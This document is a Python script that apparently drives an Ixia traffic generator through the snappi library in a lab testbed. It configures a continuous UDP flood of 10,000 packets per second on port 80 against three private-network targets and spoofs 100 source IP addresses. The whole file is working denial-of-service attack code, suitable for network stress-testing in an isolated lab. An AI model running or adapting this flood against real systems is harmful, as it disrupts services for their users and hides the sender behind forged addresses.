import snappi
import time

"""
the ip should be that of the ixia-attacker node
"""
api = snappi.api(location='http://<ixia-tg-container-ip>:80', ext='ixnetwork')

"""
create a config from the snappi library
"""
config = api.config()

# add one port for TX
port = config.ports.add(name='attacker-port', location='eth0')

# Define the flow
flow = config.flows.add(name='udp-flood')
flow.tx_rx.port.tx_name = port.name
# it should loop back unless it's targeting an endpoint
flow.tx_rx.port.rx_name = port.name  

# configure packets: Ethernet + IPv4 + UDP
eth = flow.packet.ethernet()
ipv4 = flow.packet.append('ipv4')
udp = flow.packet.append('udp')

"""
performing ip spoofing and using a range of 100
"""
ipv4.src.increment.start = '192.168.1.100'
ipv4.src.increment.step = '0.0.0.1'
ipv4.src.increment.count = 100

# these are the targets 
ipv4.dst.increment.start = '192.168.1.200'  
ipv4.dst.increment.step = '0.0.0.1'
ipv4.dst.increment.count = 3

udp.src_port.value = 12345
udp.dst_port.value = 80

flow.size.fixed = 512
flow.rate.packets_per_second = 10000  # High-rate flood
flow.duration.continuous()  # Run until manually stopped

# Apply and start
api.set_config(config)
api.transmit().start()

print("UDP flood started. Press Ctrl+C to stop.")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n*Stopping traffic*")
    api.transmit().stop()
